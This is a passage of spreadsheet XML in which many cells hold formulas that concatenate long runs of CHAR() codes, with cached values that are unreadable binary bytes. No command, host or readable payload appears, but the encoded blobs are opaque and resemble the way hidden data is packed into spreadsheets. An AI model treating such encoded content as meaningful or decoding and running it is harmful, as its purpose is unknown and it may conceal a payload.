72)&amp;CHAR(27)&amp;CHAR(237)&amp;CHAR(62)&amp;CHAR(96)&amp;CHAR(58)&amp;CHAR(215)&amp;CHAR(134)&amp;CHAR(107)&amp;CHAR(8)&amp;CHAR(222)&amp;CHAR(35)&amp;CHAR(84)&amp;CHAR(250)&amp;CHAR(237)&amp;CHAR(17)&amp;CHAR(156)&amp;CHAR(95)&amp;CHAR(26)&amp;CHAR(25)&amp;CHAR(233)&amp;CHAR(123)&amp;CHAR(71)&amp;CHAR(233)&amp;CHAR(70)&amp;CHAR(207)&amp;CHAR(17)&amp;CHAR(198)&amp;CHAR(102)&amp;CHAR(135)&amp;CHAR(155)&amp;CHAR(62)&amp;CHAR(178)&amp;CHAR(188)&amp;CHAR(41)&amp;CHAR(144)&amp;CHAR(249)&amp;CHAR(134)&amp;CHAR(27)&amp;CHAR(250)&amp;CHAR(3)&amp;CHAR(184)&amp;CHAR(209)&amp;CHAR(42)&amp;CHAR(138)&amp;CHAR(161)&amp;CHAR(104)&amp;CHAR(145)&amp;CHAR(251)&amp;CHAR(244)&amp;CHAR(197)&amp;CHAR(78)&amp;CHAR(214)&amp;CHAR(242)&amp;CHAR(116)&amp;CHAR(122)&amp;CHAR(120)&amp;CHAR(105)&amp;CHAR(114)&amp;CHAR(186)&amp;CHAR(179)&amp;CHAR(189)&amp;CHAR(85)&amp;CHAR(174)&amp;CHAR(131)&amp;CHAR(195)&amp;CHAR(189)&amp;CHAR(246)&amp;CHAR(137)&amp;CHAR(1)&amp;CHAR(127)&amp;CHAR(144)&amp;CHAR(72)&amp;CHAR(186)&amp;CHAR(216)&amp;CHAR(124)&amp;CHAR(26)&amp;CHAR(151)&amp;CHAR(37)&amp;CHAR(251)&amp;CHAR(192)&amp;CHAR(136)&amp;CHAR(36)&amp;CHAR(176)&amp;CHAR(237)&amp;CHAR(49)&amp;CHAR(141)&amp;CHAR(195)&amp;CHAR(85)&amp;CHAR(41)&amp;CHAR(213)&amp;CHAR(169)&amp;CHAR(114)&amp;CHAR(95)&amp;CHAR(197)&amp;CHAR(12)&amp;CHAR(163)&amp;CHAR(112)&amp;CHAR(24)&amp;CHAR(47)&amp;CHAR(54)&amp;CHAR(131)&amp;CHAR(225)&amp;CHAR(31)&amp;CHAR(190)&amp;CHAR(131)&amp;CHAR(93)&amp;CHAR(148)&amp;CHAR(213)&amp;CHAR(110)&amp;CHAR(28)&amp;CHAR(3)&amp;CHAR(244)&amp;CHAR(177)&amp;CHAR(254)&amp;CHAR(164)&amp;CHAR(94)&amp;CHAR(141)&amp;CHAR(243)&amp;CHAR(58)&amp;CHAR(2)&amp;CHAR(181)&amp;CHAR(246)&amp;CHAR(230)&amp;CHAR(24)&amp;CHAR(200)&amp;CHAR(95)&amp;CHAR(106)&amp;CHAR(38)&amp;CHAR(59)&amp;CHAR(88)&amp;CHAR(133)&amp;CHAR(95)&amp;CHAR(194)&amp;CHAR(133)&amp;CHAR(207)&amp;CHAR(135)&amp;CHAR(93)&amp;CHAR(57)&amp;CHAR(139)&amp;CHAR(51)&amp;CHAR(134)&amp;CHAR(26)&amp;CHAR(126)&amp;CHAR(123)&amp;CHAR(120)&amp;CHAR(28)&amp;CHAR(159)&amp;CHAR(139)&amp;CHAR(34)&amp;CHAR(30)&amp;CHAR(9)&amp;CHAR(159)&amp;CHAR(27)&amp;CHAR(162)&amp;CHAR(194)&amp;CHAR(89)&amp;CHAR(149)&amp;CHAR(243)&amp;CHAR(46)&amp;CHAR(146)&amp;CHAR(197)&amp;CHAR(89)&amp;CHAR(13)&amp;CHAR(43)&amp;CHAR(107)&amp;CHAR(126)&amp;CHAR(152)&amp;CHAR(52)&amp;CHAR(215)&amp;CHAR(83)&amp;CHAR(34)</f>
        <v>Ð—_x000F_ZwÏ‡ËÁ69ÍŽä¦§û_x0013_¼)…ÛQûª°°_x0018__x0004_0=ø*&lt;ˆ­¼_x0001__x000B_'úæd_x0012_Ž)&amp;
¬ñ•&gt;]%×dˆ¡{Ì—!U_x0007_-”ïß€O*þM]_x001D__x0019_ýøh3ú&amp;‰H_x001B_í&gt;`:×†k_x0008_Þ#Túí_x0011_œ__x001A__x0019_é{GéFÏ_x0011_Æf‡›&gt;²¼)ù†_x001B_ú_x0003_¸Ñ*Š¡h‘ûôÅNÖòtzxirº³½U®ƒÃ½ö‰_x0001_HºØ|_x001A_—%ûÀˆ$°í1ÃU)Õ©r_Å_x000C_£p_x0018_/6ƒá_x001F_¾ƒ]”Õn_x001C__x0003_ô±þ¤^ó:_x0002_µöæ_x0018_È_j&amp;;X…_Â…Ï‡]9‹3†_x001A_~{x_x001C_Ÿ‹"_x001E_	Ÿ_x001B_¢ÂY•ó.’ÅY_x000D_+k~˜4×S"</v>
      </c>
      <c r="DG56" t="str">
        <f>CHAR(82)&amp;CHAR(215)&amp;CHAR(157)&amp;CHAR(5)&amp;CHAR(12)&amp;CHAR(92)&amp;CHAR(214)&amp;CHAR(148)&amp;CHAR(162)&amp;CHAR(159)</f>
        <v>R×_x0005__x000C_\Ö”¢Ÿ</v>
      </c>
      <c r="DH56">
        <v>3</v>
      </c>
    </row>
    <row r="57" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF57" t="str">
        <f>CHAR(177)&amp;CHAR(91)&amp;CHAR(59)&amp;CHAR(41)&amp;CHAR(155)&amp;CHAR(24)&amp;CHAR(168)&amp;CHAR(86)&amp;CHAR(250)&amp;CHAR(42)&amp;CHAR(44)&amp;CHAR(62)&amp;CHAR(230)&amp;CHAR(82)&amp;CHAR(186)&amp;CHAR(9)&amp;CHAR(105)&amp;CHAR(233)&amp;CHAR(94)&amp;CHAR(49)&amp;CHAR(39)&amp;CHAR(57)&amp;CHAR(111)&amp;CHAR(193)&amp;CHAR(130)&amp;CHAR(158)&amp;CHAR(111)&amp;CHAR(39)&amp;CHAR(80)&amp;CHAR(3)&amp;CHAR(37)&amp;CHAR(34)&amp;CHAR(246)&amp;CHAR(62)&amp;CHAR(195)&amp;CHAR(54)&amp;CHAR(241)&amp;CHAR(64)&amp;CHAR(104)&amp;CHAR(94)&amp;CHAR(237)&amp;CHAR(153)&amp;CHAR(63)&amp;CHAR(158)&amp;CHAR(213)&amp;CHAR(235)&amp;CHAR(45)&amp;CHAR(188)&amp;CHAR(50)&amp;CHAR(101)&amp;CHAR(3)&amp;CHAR(66)&amp;CHAR(185)&amp;CHAR(140)&amp;CHAR(200)&amp;CHAR(191)&amp;CHAR(239)&amp;CHAR(35)&amp;CHAR(228)&amp;CHAR(30)&amp;CHAR(31)&amp;CHAR(53)&amp;CHAR(108)&amp;CHAR(176)&amp;CHAR(163)&amp;CHAR(12)&amp;CHAR(42)&amp;CHAR(214)&amp;CHAR(171)&amp;CHAR(34)&amp;CHAR(104)&amp;CHAR(27)&amp;CHAR(167)&amp;CHAR(244)&amp;CHAR(190)&amp;CHAR(123)&amp;CHAR(25)&amp;CHAR(175)&amp;CHAR(13)&amp;CHAR(80)&amp;CHAR(41)&amp;CHAR(99)&amp;CHAR(102)&amp;CHAR(139)&amp;CHAR(175)&amp;CHAR(87)&amp;CHAR(97)&amp;CHAR(74)&amp;CHAR(7)&amp;CHAR(173)&amp;CHAR(164)&amp;CHAR(250)&amp;CHAR(102)&amp;CHAR(141)&amp;CHAR(87)&amp;CHAR(39)&amp;CHAR(119)&amp;CHAR(4)&amp;CHAR(185)&amp;CHAR(62)&amp;CHAR(100)&amp;CHAR(121)&amp;CHAR(18)&amp;CHAR(18)&amp;CHAR(178)&amp;CHAR(243)&amp;CHAR(100)&amp;CHAR(192)&amp;CHAR(156)&amp;CHAR(31)&amp;CHAR(34)&amp;CHAR(207)&amp;CHAR(195)&amp;CHAR(78)&amp;CHAR(252)&amp;CHAR(4)&amp;CHAR(203)&amp;CHAR(151)&amp;CHAR(208)&amp;CHAR(38)&amp;CHAR(67)&amp;CHAR(141)&amp;CHAR(228)&amp;CHAR(240)&amp;CHAR(8)&amp;CHAR(82)&amp;CHAR(177)&amp;CHAR(58)&amp;CHAR(133)&amp;CHAR(87)&amp;CHAR(141)&amp;CHAR(28)&amp;CHAR(153)&amp;CHAR(153)&amp;CHAR(9)&amp;CHAR(174)&amp;CHAR(140)&amp;CHAR(96)&amp;CHAR(183)&amp;CHAR(51)&amp;CHAR(237)&amp;CHAR(19)&amp;CHAR(12)&amp;CHAR(21)&amp;CHAR(9)&amp;CHAR(202)&amp;CHAR(197)&amp;CHAR(166)&amp;CHAR(18)&amp;CHAR(251)&amp;CHAR(98)&amp;CHAR(32)&amp;CHAR(161)&amp;CHAR(149)&amp;CHAR(250)&amp;CHAR(246)&amp;CHAR(169)&amp;CHAR(244)&amp;CHAR(195)&amp;CHAR(182)&amp;CHAR(218)&amp;CHAR(255)&amp;CHAR(94)&amp;CHAR(109)&amp;CHAR(23)&amp;CHAR(85)&amp;CHAR(76)&amp;CHAR(157)&amp;CHAR(49)&amp;CHAR(197)&amp;CHAR(245)&amp;CHAR(55)&amp;CHAR(170)&amp;CHAR(141)&amp;CHAR(138)&amp;CHAR(178)&amp;CHAR(72)&amp;CHAR(124)&amp;CHAR(95)&amp;CHAR(129)&amp;CHAR(37)&amp;CHAR(125)&amp;CHAR(94)&amp;CHAR(73)&amp;CHAR(58)&amp;CHAR(11)&amp;CHAR(106)&amp;CHAR(33)&amp;CHAR(7)&amp;CHAR(229)&amp;CHAR(206)&amp;CHAR(212)&amp;CHAR(17)&amp;CHAR(197)&amp;CHAR(161)&amp;CHAR(242)&amp;CHAR(240)&amp;CHAR(242)&amp;CHAR(197)&amp;CHAR(22)&amp;CHAR(33)&amp;CHAR(138)&amp;CHAR(12)&amp;CHAR(182)&amp;CHAR(103)&amp;CHAR(104)&amp;CHAR(161)&amp;CHAR(16)&amp;CHAR(148)&amp;CHAR(248)&amp;CHAR(117)&amp;CHAR(232)&amp;CHAR(64)&amp;CHAR(209)&amp;CHAR(8)&amp;CHAR(170)&amp;CHAR(243)&amp;CHAR(224)&amp;CHAR(141)&amp;CHAR(156)&amp;CHAR(66)&amp;CHAR(243)&amp;CHAR(2)&amp;CHAR(78)&amp;CHAR(100)&amp;CHAR(165)&amp;CHAR(201)&amp;CHAR(231)&amp;CHAR(173)&amp;CHAR(66)&amp;CHAR(40)&amp;CHAR(212)&amp;CHAR(102)&amp;CHAR(50)&amp;CHAR(189)&amp;CHAR(56)&amp;CHAR(165)&amp;CHAR(93)&amp;CHAR(176)&amp;CHAR(115)&amp;CHAR(152)&amp;CHAR(46)&amp;CHAR(244)&amp;CHAR(27)&amp;CHAR(103)&amp;CHAR(137)&amp;CHAR(96)&amp;CHAR(6)&amp;CHAR(188)&amp;CHAR(20)&amp;CHAR(232)&amp;CHAR(84)&amp;CHAR(164)&amp;CHAR(218)&amp;CHAR(41)</f>
        <v>±[;)›_x0018_¨Vú*,&gt;æRº	ié^1'9oÁ‚žo'P_x0003_%"ö&gt;Ã6ñ@h^í™?žÕë-¼2e_x0003_B¹ŒÈ¿ï#ä_x001E__x001F_5l°£_x000C_*Ö«"h_x001B_§ô¾{_x0019_¯_x000D_P)cf‹¯WaJ_x0007_­¤úfW'w_x0004_¹&gt;dy_x0012__x0012_²ódÀœ_x001F_"ÏÃNü_x0004_Ë—Ð&amp;Cäð_x0008_R±:…W_x001C_™™	®Œ`·3í_x0013__x000C__x0015_	ÊÅ¦_x0012_ûb ¡•úö©ôÃ¶Úÿ^m_x0017_UL1Åõ7ªŠ²H|_%}^I:_x000B_j!_x0007_åÎÔ_x0011_Å¡òðòÅ_x0016_!Š_x000C_¶gh¡_x0010_”øuè@Ñ_x0008_ªóàœBó_x0002_Nd¥Éç­B(Ôf2½8¥]°s˜.ô_x001B_g‰`_x0006_¼_x0014_èT¤Ú)</v>
      </c>
      <c r="DG57" t="str">
        <f>CHAR(88)&amp;CHAR(147)&amp;CHAR(65)&amp;CHAR(122)&amp;CHAR(159)&amp;CHAR(29)&amp;CHAR(26)&amp;CHAR(90)&amp;CHAR(216)&amp;CHAR(254)</f>
        <v>X“AzŸ_x001D__x001A_ZØþ</v>
      </c>
      <c r="DH57">
        <v>4</v>
      </c>
    </row>
    <row r="58" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF58" t="str">
        <f>CHAR(132)&amp;CHAR(84)&amp;CHAR(127)&amp;CHAR(74)&amp;CHAR(5)&amp;CHAR(117)&amp;CHAR(204)&amp;CHAR(158)&amp;CHAR(134)&amp;CHAR(192)&amp;CHAR(19)&amp;CHAR(117)&amp;CHAR(38)&amp;CHAR(115)&amp;CHAR(38)&amp;CHAR(72)&amp;CHAR(179)&amp;CHAR(107)&amp;CHAR(17)&amp;CHAR(69)&amp;CHAR(243)&amp;CHAR(83)&amp;CHAR(145)&amp;CHAR(35)&amp;CHAR(143)&amp;CHAR(49)&amp;CHAR(175)&amp;CHAR(125)&amp;CHAR(54)&amp;CHAR(151)&amp;CHAR(244)&amp;CHAR(124)&amp;CHAR(35)&amp;CHAR(11)&amp;CHAR(28)&amp;CHAR(50)&amp;CHAR(76)&amp;CHAR(36)&amp;CHAR(79)&amp;CHAR(251)&amp;CHAR(119)&amp;CHAR(208)&amp;CHAR(169)&amp;CHAR(223)&amp;CHAR(136)&amp;CHAR(154)&amp;CHAR(126)&amp;CHAR(132)&amp;CHAR(195)&amp;CHAR(1)&amp;CHAR(26)&amp;CHAR(154)&amp;CHAR(201)&amp;CHAR(44)&amp;CHAR(62)&amp;CHAR(150)&amp;CHAR(181)&amp;CHAR(16)&amp;CHAR(110)&amp;CHAR(189)&amp;CHAR(243)&amp;CHAR(155)&amp;CHAR(101)&amp;CHAR(65)&amp;CHAR(47)&amp;CHAR(74)&amp;CHAR(181)&amp;CHAR(214)&amp;CHAR(71)&amp;CHAR(92)&amp;CHAR(48)&amp;CHAR(47)&amp;CHAR(95)&amp;CHAR(218)&amp;CHAR(126)&amp;CHAR(240)&amp;CHAR(63)&amp;CHAR(244)&amp;CHAR(119)&amp;CHAR(202)&amp;CHAR(154)&amp;CHAR(215)&amp;CHAR(209)&amp;CHAR(217)&amp;CHAR(40)&amp;CHAR(230)&amp;CHAR(113)&amp;CHAR(6)&amp;CHAR(62)&amp;CHAR(125)&amp;CHAR(221)&amp;CHAR(197)&amp;CHAR(153)&amp;CHAR(183)&amp;CHAR(10)&amp;CHAR(213)&amp;CHAR(28)&amp;CHAR(67)&amp;CHAR(69)&amp;CHAR(122)&amp;CHAR(219)&amp;CHAR(53)&amp;CHAR(39)&amp;CHAR(147)&amp;CHAR(24)&amp;CHAR(235)&amp;CHAR(56)&amp;CHAR(147)&amp;CHAR(229)&amp;CHAR(161)&amp;CHAR(221)&amp;CHAR(208)&amp;CHAR(21)&amp;CHAR(156)&amp;CHAR(217)&amp;CHAR(115)&amp;CHAR(195)&amp;CHAR(218)&amp;CHAR(57)&amp;CHAR(50)&amp;CHAR(116)&amp;CHAR(220)&amp;CHAR(119)&amp;CHAR(249)&amp;CHAR(21)&amp;CHAR(21)&amp;CHAR(170)&amp;CHAR(250)&amp;CHAR(194)&amp;CHAR(129)&amp;CHAR(204)&amp;CHAR(230)&amp;CHAR(113)&amp;CHAR(136)&amp;CHAR(5)&amp;CHAR(233)&amp;CHAR(226)&amp;CHAR(54)&amp;CHAR(99)&amp;CHAR(242)&amp;CHAR(132)&amp;CHAR(85)&amp;CHAR(80)&amp;CHAR(50)&amp;CHAR(76)&amp;CHAR(18)&amp;CHAR(214)&amp;CHAR(233)&amp;CHAR(197)&amp;CHAR(159)&amp;CHAR(8)&amp;CHAR(164)&amp;CHAR(25)&amp;CHAR(247)&amp;CHAR(38)&amp;CHAR(173)&amp;CHAR(128)&amp;CHAR(18)&amp;CHAR(49)&amp;CHAR(241)&amp;CHAR(248)&amp;CHAR(137)&amp;CHAR(142)&amp;CHAR(113)&amp;CHAR(3)&amp;CHAR(40)&amp;CHAR(174)&amp;CHAR(23)&amp;CHAR(145)&amp;CHAR(251)&amp;CHAR(103)&amp;CHAR(96)&amp;CHAR(137)&amp;CHAR(237)&amp;CHAR(23)&amp;CHAR(59)&amp;CHAR(129)&amp;CHAR(232)&amp;CHAR(63)&amp;CHAR(216)&amp;CHAR(40)&amp;CHAR(3)&amp;CHAR(55)&amp;CHAR(143)&amp;CHAR(84)&amp;CHAR(62)&amp;CHAR(19)&amp;CHAR(35)&amp;CHAR(90)&amp;CHAR(24)&amp;CHAR(83)&amp;CHAR(114)&amp;CHAR(216)&amp;CHAR(252)&amp;CHAR(35)&amp;CHAR(24)&amp;CHAR(107)&amp;CHAR(118)&amp;CHAR(123)&amp;CHAR(129)&amp;CHAR(99)&amp;CHAR(75)&amp;CHAR(138)&amp;CHAR(132)&amp;CHAR(130)&amp;CHAR(250)&amp;CHAR(140)&amp;CHAR(35)&amp;CHAR(40)&amp;CHAR(4)&amp;CHAR(241)&amp;CHAR(125)&amp;CHAR(73)&amp;CHAR(124)&amp;CHAR(40)&amp;CHAR(156)&amp;CHAR(140)&amp;CHAR(172)&amp;CHAR(236)&amp;CHAR(120)&amp;CHAR(216)&amp;CHAR(187)&amp;CHAR(83)&amp;CHAR(58)&amp;CHAR(43)&amp;CHAR(56)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(118)&amp;CHAR(14)&amp;CHAR(141)&amp;CHAR(17)&amp;CHAR(29)&amp;CHAR(38)&amp;CHAR(166)&amp;CHAR(109)&amp;CHAR(13)&amp;CHAR(24)&amp;CHAR(224)&amp;CHAR(172)&amp;CHAR(131)&amp;CHAR(144)&amp;CHAR(186)&amp;CHAR(142)&amp;CHAR(10)&amp;CHAR(236)&amp;CHAR(221)&amp;CHAR(20)&amp;CHAR(63)&amp;CHAR(83)&amp;CHAR(72)&amp;CHAR(166)&amp;CHAR(228)&amp;CHAR(130)&amp;CHAR(27)</f>
        <v>„TJ_x0005_uÌž†À_x0013_u&amp;s&amp;H³k_x0011_EóS‘#1¯}6—ô|#_x000B__x001C_2L$OûwÐ©ßˆš~„Ã_x0001__x001A_šÉ,&gt;–µ_x0010_n½ó›eA/JµÖG\0/_Ú~ð?ôwÊš×ÑÙ(æq_x0006_&gt;}ÝÅ™·
Õ_x001C_CEzÛ5'“_x0018_ë8“å¡ÝÐ_x0015_œÙsÃÚ92tÜwù_x0015__x0015_ªúÂÌæqˆ_x0005_éâ6cò„UP2L_x0012_ÖéÅŸ_x0008_¤_x0019_÷&amp;­€_x0012_1ñø‰Žq_x0003_(®_x0017_‘ûg`‰í_x0017_;è?Ø(_x0003_7T&gt;_x0013_#Z_x0018_SrØü#_x0018_kv{cKŠ„‚úŒ#(_x0004_ñ}I|(œŒ¬ìxØ»S:+8_x0008__x0002_v_x000E__x0011__x001D_&amp;¦m_x000D__x0018_à¬ƒºŽ
ìÝ_x0014_?SH¦ä‚_x001B_</v>
      </c>
      <c r="DG58" t="str">
        <f>CHAR(204)&amp;CHAR(124)&amp;CHAR(159)&amp;CHAR(245)&amp;CHAR(160)&amp;CHAR(42)&amp;CHAR(42)&amp;CHAR(121)&amp;CHAR(130)&amp;CHAR(241)</f>
        <v>Ì|Ÿõ **y‚ñ</v>
      </c>
      <c r="DH58">
        <v>5</v>
      </c>
    </row>
    <row r="59" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF59" t="str">
        <f>CHAR(253)&amp;CHAR(184)&amp;CHAR(14)&amp;CHAR(50)&amp;CHAR(174)&amp;CHAR(145)&amp;CHAR(21)&amp;CHAR(10)&amp;CHAR(50)&amp;CHAR(241)&amp;CHAR(29)&amp;CHAR(144)&amp;CHAR(150)&amp;CHAR(87)&amp;CHAR(44)&amp;CHAR(66)&amp;CHAR(184)&amp;CHAR(71)&amp;CHAR(62)&amp;CHAR(22)&amp;CHAR(143)&amp;CHAR(137)&amp;CHAR(131)&amp;CHAR(147)&amp;CHAR(186)&amp;CHAR(81)&amp;CHAR(158)&amp;CHAR(69)&amp;CHAR(137)&amp;CHAR(183)&amp;CHAR(250)&amp;CHAR(40)&amp;CHAR(42)&amp;CHAR(53)&amp;CHAR(103)&amp;CHAR(13)&amp;CHAR(233)&amp;CHAR(97)&amp;CHAR(234)&amp;CHAR(95)&amp;CHAR(155)&amp;CHAR(190)&amp;CHAR(35)&amp;CHAR(23)&amp;CHAR(80)&amp;CHAR(79)&amp;CHAR(83)&amp;CHAR(255)&amp;CHAR(47)&amp;CHAR(51)&amp;CHAR(70)&amp;CHAR(28)&amp;CHAR(127)&amp;CHAR(204)&amp;CHAR(79)&amp;CHAR(157)&amp;CHAR(240)&amp;CHAR(163)&amp;CHAR(245)&amp;CHAR(129)&amp;CHAR(131)&amp;CHAR(56)&amp;CHAR(75)&amp;CHAR(96)&amp;CHAR(48)&amp;CHAR(204)&amp;CHAR(159)&amp;CHAR(195)&amp;CHAR(220)&amp;CHAR(15)&amp;CHAR(225)&amp;CHAR(106)&amp;CHAR(171)&amp;CHAR(227)&amp;CHAR(51)&amp;CHAR(227)&amp;CHAR(198)&amp;CHAR(79)&amp;CHAR(35)&amp;CHAR(225)&amp;CHAR(177)&amp;CHAR(195)&amp;CHAR(191)&amp;CHAR(217)&amp;CHAR(56)&amp;CHAR(52)&amp;CHAR(235)&amp;CHAR(30)&amp;CHAR(106)&amp;CHAR(141)&amp;CHAR(136)&amp;CHAR(62)&amp;CHAR(193)&amp;CHAR(214)&amp;CHAR(176)&amp;CHAR(80)&amp;CHAR(209)&amp;CHAR(45)&amp;CHAR(27)&amp;CHAR(18)&amp;CHAR(197)&amp;CHAR(64)&amp;CHAR(231)&amp;CHAR(207)&amp;CHAR(167)&amp;CHAR(35)&amp;CHAR(141)&amp;CHAR(176)&amp;CHAR(89)&amp;CHAR(215)&amp;CHAR(215)&amp;CHAR(9)&amp;CHAR(161)&amp;CHAR(139)&amp;CHAR(64)&amp;CHAR(229)&amp;CHAR(39)&amp;CHAR(207)&amp;CHAR(237)&amp;CHAR(84)&amp;CHAR(167)&amp;CHAR(41)&amp;CHAR(10)&amp;CHAR(110)&amp;CHAR(172)&amp;CHAR(179)&amp;CHAR(34)&amp;CHAR(248)&amp;CHAR(32)&amp;CHAR(64)&amp;CHAR(213)&amp;CHAR(225)&amp;CHAR(28)&amp;CHAR(108)&amp;CHAR(20)&amp;CHAR(104)&amp;CHAR(192)&amp;CHAR(56)&amp;CHAR(49)&amp;CHAR(53)&amp;CHAR(40)&amp;CHAR(11)&amp;CHAR(166)&amp;CHAR(54)&amp;CHAR(165)&amp;CHAR(185)&amp;CHAR(68)&amp;CHAR(122)&amp;CHAR(132)&amp;CHAR(242)&amp;CHAR(151)&amp;CHAR(103)&amp;CHAR(213)&amp;CHAR(181)&amp;CHAR(90)&amp;CHAR(93)&amp;CHAR(159)&amp;CHAR(44)&amp;CHAR(169)&amp;CHAR(99)&amp;CHAR(153)&amp;CHAR(199)&amp;CHAR(187)&amp;CHAR(89)&amp;CHAR(248)&amp;CHAR(204)&amp;CHAR(120)&amp;CHAR(9)&amp;CHAR(167)&amp;CHAR(88)&amp;CHAR(154)&amp;CHAR(177)&amp;CHAR(23)&amp;CHAR(38)&amp;CHAR(245)&amp;CHAR(49)&amp;CHAR(179)&amp;CHAR(234)&amp;CHAR(215)&amp;CHAR(20)&amp;CHAR(93)&amp;CHAR(216)&amp;CHAR(147)&amp;CHAR(234)&amp;CHAR(51)&amp;CHAR(66)&amp;CHAR(210)&amp;CHAR(226)&amp;CHAR(148)&amp;CHAR(249)&amp;CHAR(63)&amp;CHAR(69)&amp;CHAR(228)&amp;CHAR(113)&amp;CHAR(121)&amp;CHAR(131)&amp;CHAR(110)&amp;CHAR(168)&amp;CHAR(12)&amp;CHAR(56)&amp;CHAR(79)&amp;CHAR(234)&amp;CHAR(133)&amp;CHAR(143)&amp;CHAR(66)&amp;CHAR(236)&amp;CHAR(143)&amp;CHAR(126)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(143)&amp;CHAR(212)&amp;CHAR(227)&amp;CHAR(36)&amp;CHAR(152)&amp;CHAR(160)&amp;CHAR(233)&amp;CHAR(20)&amp;CHAR(111)&amp;CHAR(42)&amp;CHAR(222)&amp;CHAR(126)&amp;CHAR(42)&amp;CHAR(6)&amp;CHAR(86)&amp;CHAR(153)&amp;CHAR(65)&amp;CHAR(244)&amp;CHAR(178)&amp;CHAR(202)&amp;CHAR(112)&amp;CHAR(121)&amp;CHAR(185)&amp;CHAR(96)&amp;CHAR(27)&amp;CHAR(104)&amp;CHAR(9)&amp;CHAR(125)&amp;CHAR(199)&amp;CHAR(53)&amp;CHAR(51)&amp;CHAR(33)&amp;CHAR(151)&amp;CHAR(28)&amp;CHAR(244)&amp;CHAR(180)&amp;CHAR(68)&amp;CHAR(225)&amp;CHAR(218)&amp;CHAR(44)&amp;CHAR(52)&amp;CHAR(117)&amp;CHAR(246)&amp;CHAR(250)&amp;CHAR(45)</f>
        <v>ý¸_x000E_2®‘_x0015_
2ñ_x001D_–W,B¸G&gt;_x0016_‰ƒ“ºQžE‰·ú(*5g_x000D_éaê_›¾#_x0017_POSÿ/3F_x001C_ÌOð£õƒ8K`0ÌŸÃÜ_x000F_áj«ã3ãÆO#á±Ã¿Ù84ë_x001E_jˆ&gt;ÁÖ°PÑ-_x001B__x0012_Å@çÏ§#°Y××	¡‹@å'ÏíT§)
n¬³"ø @Õá_x001C_l_x0014_hÀ815(_x000B_¦6¥¹Dz„ò—gÕµZ]Ÿ,©c™Ç»YøÌx	§Xš±_x0017_&amp;õ1³ê×_x0014_]Ø“ê3BÒâ”ù?Eäqyƒn¨_x000C_8Oê…Bì~6ÍÔã$˜ é_x0014_o*Þ~*_x0006_V™Aô²Êpy¹`_x001B_h	}Ç53!—_x001C_ô´DáÚ,4uöú-</v>
      </c>
      <c r="DG59" t="str">
        <f>CHAR(146)&amp;CHAR(151)&amp;CHAR(84)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(227)&amp;CHAR(130)&amp;CHAR(247)&amp;CHAR(171)&amp;CHAR(56)</f>
        <v>’—T×Õã‚÷«8</v>
      </c>
      <c r="DH59">
        <v>6</v>
      </c>
    </row>
    <row r="60" spans="110:112" x14ac:dyDescent="0.45">
      <c r="DF60" t="str">
        <f>CHAR(112)&amp;CHAR(75)&amp;CHAR(128)&amp;CHAR(158)&amp;CHAR(56)&amp;CHAR(80)&amp;CHAR(36)&amp;CHAR(157)&amp;CHAR(166)&amp;CHAR(55)&amp;CHAR(87)&amp;CHAR(137)&amp;CHAR(80)&amp;CHAR(189)&amp;CHAR(22)&amp;CHAR(104)&amp;CHAR(164)&amp;CHAR(11)&amp;CHAR(234)&amp;CHAR(37)&amp;CHAR(11)&amp;CHAR(45)&amp;CHAR(99)&amp;CHAR(148)&amp;CHAR(240)&amp;CHAR(237)&amp;CHAR(13)&amp;CHAR(175)&amp;CHAR(158)&amp;CHAR(101)&amp;CHAR(81)&amp;CHAR(56)&amp;CHAR(170)&amp;CHAR(234)&amp;CHAR(229)&amp;CHAR(138)&amp;CHAR(152)&amp;CHAR(79)&amp;CHAR(31)&amp;CHAR(171)&amp;CHAR(167)&amp;CHAR(197)&amp;CHAR(90)&amp;CHAR(73)&amp;CHAR(127)&amp;CHAR(19)&amp;CHAR(88)&amp;CHAR(64)&amp;CHAR(189)&amp;CHAR(165)&amp;CHAR(72)&amp;CHAR(144)&amp;CHAR(217)&amp;CHAR(65)&amp;CHAR(255)&amp;CHAR(122)&amp;CHAR(214)&amp;CHAR(35)&amp;CHAR(47)&amp;CHAR(143)&amp;CHAR(129)&amp;CHAR(169)&amp;CHAR(103)&amp;CHAR(114)&amp;CHAR(198)&amp;CHAR(19)&amp;CHAR(76)&amp;CHAR(189)&amp;CHAR(145)&amp;CHAR(174)&amp;CHAR(170)&amp;CHAR(196)&amp;CHAR(202)&amp;CHAR(191)&amp;CHAR(75)&amp;CHAR(31)&amp;CHAR(101)&amp;CHAR(13)&amp;CHAR(153)&amp;CHAR(42)&amp;CHAR(127)&amp;CHAR(166)&amp;CHAR(68)&amp;CHAR(86)&amp;CHAR(7)&amp;CHAR(28)&amp;CHAR(172)&amp;CHAR(218)&amp;CHAR(177)&amp;CHAR(153)&amp;CHAR(27)&amp;CHAR(119)&amp;CHAR(69)&amp;CHAR(65)&amp;CHAR(38)&amp;CHAR(23)&amp;CHAR(189)&amp;CHAR(186)&amp;CHAR(86)&amp;CHAR(138)&amp;CHAR(65)&amp;CHAR(141)&amp;CHAR(78)&amp;CHAR(68)&amp;CHAR(26)&amp;CHAR(103)&amp;CHAR(207)&amp;CHAR(6)&amp;CHAR(138)&amp;CHAR(174)&amp;CHAR(103)&amp;CHAR(181)&amp;CHAR(110)&amp;CHAR(229)&amp;CHAR(56)&amp;CHAR(190)&amp;CHAR(184)&amp;CHAR(17)&amp;CHAR(253)&amp;CHAR(92)&amp;CHAR(213)&amp;CHAR(181)&amp;CHAR(228)&amp;CHAR(223)&amp;CHAR(182)&amp;CHAR(103)&amp;CHAR(212)&amp;CHAR(33)&amp;CHAR(103)&amp;CHAR(89)&amp;CHAR(234)&amp;CHAR(161)&amp;CHAR(255)&amp;CHAR(115)&amp;CHAR(171)&amp;CHAR(114)&amp;CHAR(238)&amp;CHAR(44)&amp;CHAR(159)&amp;CHAR(182)&amp;CHAR(84)&amp;CHAR(198)&amp;CHAR(139)&amp;CHAR(125)&amp;CHAR(226)&amp;CHAR(149)&amp;CHAR(23)&amp;CHAR(12)&amp;CHAR(167)&amp;CHAR(6)&amp;CHAR(253)&amp;CHAR(52)&amp;CHAR(223)&amp;CHAR(91)&amp;CHAR(119)&amp;CHAR(78)&amp;CHAR(239)&amp;CHAR(232)&amp;CHAR(124)&amp;CHAR(41)&amp;CHAR(225)&amp;CHAR(72)&amp;CHAR(200)&amp;CHAR(185)&amp;CHA